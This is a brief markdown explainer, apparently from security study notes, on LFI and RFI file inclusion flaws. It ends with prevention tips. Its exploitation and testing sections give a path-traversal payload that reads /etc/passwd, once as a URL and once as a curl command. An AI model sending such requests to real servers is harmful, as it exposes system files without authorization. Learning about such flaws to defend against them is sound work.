# 📂 File Inclusion Vulnerabilities (LFI & RFI)

## Overview
File Inclusion vulnerabilities allow attackers to include unauthorized files on a server.

## Types
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)

## Exploitation Example
```bash
http://vulnerable-site.com/index.php?page=../../../../etc/passwd
```

## Testing Using Bash (curl)
```bash
curl "http://vulnerable-site.com/index.php?page=../../../../etc/passwd"
```

## Prevention
- Whitelist allowed files
- Disable remote file inclusion
- Proper input validation

## Conclusion
File inclusion flaws can lead to sensitive data exposure and remote code execution.
